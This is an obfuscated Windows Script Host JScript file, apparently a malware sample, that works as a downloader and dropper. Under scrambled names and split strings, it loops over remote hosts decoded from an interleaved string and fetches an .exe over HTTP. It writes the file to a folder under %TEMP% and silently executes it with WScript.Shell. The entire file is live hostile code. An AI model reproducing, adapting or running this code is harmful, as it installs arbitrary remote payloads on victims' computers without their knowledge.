

function qpgooRsza(hFtUplMTjTZ) {
var MQpoEINi = WScript.CreateObject("Wscript.Shell");
MQpoEINi.Run(hFtUplMTjTZ, 0x1, 0x0);
}
function tGaKjijiO(ziRVp,YkoFH,fGJoh) {
var XjErj = "HINFuw xAW pt.Shell KudTAwJ Scri".split(" ");
var dYB=((1)?"W" + XjErj[4]:"")+XjErj[2];
var vF = WScript.CreateObject(dYB);
var OF = "%TEMP%\\";
return vF.ExpandEnvironmentStrings(OF);
}
function LUjyUXWF() {
var kBQSgun = "ipting";
var FkwHSIKgJK = "ile";
var MftNZ = "System";
return "Sc" + "r" + kBQSgun + ".F" + FkwHSIKgJK + MftNZ + "Obj" + "ect";
}
function MwDT(mqVsU) {
return WScript.CreateObject(mqVsU);
}
function xtdh(vQtPG,fDFyC) {
vQtPG.write(fDFyC);
}
function VIvd(mufzb) {
mufzb.open();
}
function LTST(HvPht,jaYvv) {
HvPht.saveToFile(jaYvv,440-438);
}
function Vpad(sPOJM,SzCbq,DexYk) {
sPOJM.open(DexYk,SzCbq,false);
}
function NcCQ(HUyKP) {
if (HUyKP == 789-589){return true;} else {return false;}
}
function zOIB(EKgRv) {
if (EKgRv > 173510-855){return true;} else {return false;}
}
function hdhv(FZqpd) {
var bvUPU="";
for(h=(417-417); h < FZqpd.length; h++)
if (h % (492-490) != (696-696)) {
bvUPU += FZqpd.substr(h, 317-316);
}
return bvUPU;
}
function heyf(gQJnj) {
gQJnj.send();
}
function FNsm(HjcmW) {
return HjcmW.status;
}
function NlKeM(iKnKzV) {
return new ActiveXObject(iKnKzV);
}
var YD="9oshoellcl9o8wRrAuNfDf3.WcNojmL c/a8U0O.QexxVem?a ftGhciasNissgiRtosZqQqY.YcYoImD/X8M0y.teQx1em?x M?y K?A x?";
var p = hdhv(YD).split(" ");
var deN = tGaKjijiO("stEM","JOGtU","FloJjA");
var wGD = NlKeM(LUjyUXWF());
var HUyf = deN+"TVrKRjc\\";
try{
wGD.CreateFolder(HUyf);
}catch(HvmeNl){
};
var onQ = "2.XMLH";
var Syp = (onQ + "TTP" + " KROXRDh EEElW XML ream St kSWlmxNr AD IZktdJd OD").split(" ");
var xp = true  , bJHc = Syp[7] + "" + Syp[9];
var rv = MwDT("MS"+Syp[3]+(883959, Syp[0]));
var HbR = MwDT(bJHc + "B." + Syp[5]+(477337, Syp[4]));
var MPr = 0;
var C = 1;
var twQRjax = 486515;
var V=MPr;
while (true)  {
if(V>=p.length) {break;}
var gg = 0;
var JUZ = ("ht" + " OLvjKgk tp gxqGe yDvvIhJD :// wysIGrR .e xe G ET").split(" ");
try  {
Vpad(rv,JUZ[0]+JUZ[2]+JUZ[5]+p[V]+C, JUZ[9]+JUZ[10]); heyf(rv); if (NcCQ(FNsm(rv)))  {      
VIvd(HbR); HbR.type = 1; xtdh(HbR,rv.responseBody); if (zOIB(HbR.size))  {
gg = 1; HbR.position = 0; LTST(HbR,/*fasG35VRWa*/HUyf/*D8YY12t1IS*/+twQRjax+JUZ[7]+JUZ[8]); try  {
if (((new Date())>0,7458795888)) {
qpgooRsza(HUyf+twQRjax+/*CwRP10g0lM*/JUZ[7]+JUZ[8]/*KHA045F3Ds*/); 
break;
}
}
catch (mZ)  {
}; 
}; HbR.close(); 
}; 
if (gg == 1)  {
MPr = V; break; 
}; 
}
catch (mZ)  { 
}; 
V++;
}; 

